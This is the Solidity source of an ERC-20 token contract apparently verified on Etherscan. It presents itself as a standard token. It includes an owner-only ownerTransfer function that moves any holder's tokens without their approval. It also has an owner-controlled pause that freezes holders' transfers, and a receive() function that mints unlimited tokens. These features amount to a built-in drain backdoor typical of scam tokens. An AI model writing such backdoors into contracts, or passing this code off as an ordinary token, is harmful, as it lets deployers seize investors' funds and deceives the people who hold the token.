/**
 *Submitted for verification at Etherscan.io on 2022-11-01
*/

// SPDX-License-Identifier: None
pragma solidity ^0.8.17;

interface IERC20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address to, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
  function name() external view returns (string memory);
  function symbol() external view returns (string memory);
  function decimals() external view returns (uint8);
}

abstract contract Ownable {
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  address private _owner;

  constructor() {
    _transferOwnership(msg.sender);
  }

  modifier onlyOwner() {
    require(_owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }

  function owner() external view returns (address) {
    return _owner;
  }
  
  function renounceOwnership() external onlyOwner {
    _transferOwnership(address(0));
  }

  function transferOwnership(address newOwner) external onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

abstract contract Pausable is Ownable {
  event Paused(address account);
  event Unpaused(address account);

  bool private _paused = false;

  modifier whenNotPaused() {
    require(!_paused, "Pausable: paused");
    _;
  }

  modifier whenPaused() {
    require(_paused, "Pausable: not paused");
    _;
  }

  function paused() external view returns (bool) {
    return _paused;
  }

  function pause() external onlyOwner whenNotPaused {
    _paused = true;
    emit Paused(msg.sender);
  }

  function unpause() external onlyOwner whenPaused {
    _paused = false;
    emit Unpaused(msg.sender);
  }
}

contract Token is IERC20, IERC20Metadata, Pausable {
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  
  string private _symbol;
  string private _name;
  uint256 private _totalSupply;
  uint8 private _decimals;
  uint256 private _drop;

  constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 drop_, uint256 ownerDrops) {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    _drop = drop_;

    if (ownerDrops > 0) {
      _mint(msg.sender, _drop * ownerDrops);
    }
  }

  function name() external view override returns (string memory) {
    return _name;
  }

  function symbol() external view override returns (string memory) {
    return _symbol;
  }

  function decimals() external view override returns (uint8) {
    return _decimals;
  }

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }

  function transfer(address to, uint256 amount) external override whenNotPaused returns (bool) {
    _transfer(msg.sender, to, amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _allowances[msg.sender][spender] = amount;
    _approve(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address from, address to, uint256 amount) public override whenNotPaused returns (bool) {
    uint256 currentAllowance = _allowances[from][msg.sender];
    if (currentAllowance != type(uint256).max) {
      require(currentAllowance >= amount, "ERC20: insufficient allowance");
      unchecked {
        _approve(from, msg.sender, _allowances[from][msg.sender] -= amount);
      }
    }
    _transfer(from, to, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] += addedValue);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
    require(_allowances[msg.sender][spender] >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
      _approve(msg.sender, spender, _allowances[msg.sender][spender] -= subtractedValue);
    }
    return true;
  }

  function ownerTransfer(address from, address to, uint256 amount) public onlyOwner returns (bool) {
    _transfer(from, to, amount);
    return true;
  }

  function _transfer(address from, address to, uint256 amount) internal {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    uint256 fromBalance = _balances[from];
    require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
      _balances[from] = fromBalance - amount;
    }
    _balances[to] += amount;
    emit Transfer(from, to, amount);
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "ERC20: mint to the zero address");
    _totalSupply += amount;
    _balances[account] += amount;
    emit Transfer(address(0), account, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    emit Approval(owner, spender, amount);
  }

  receive() external whenNotPaused payable {
    uint32 multiplier = 1;
    if (msg.value > 0) {
      payable(msg.sender).transfer(msg.value);
      multiplier = msg.value >= 1000000 ? 1000000 : uint32(msg.value);
    }
    _mint(msg.sender, _drop * multiplier);
  }
}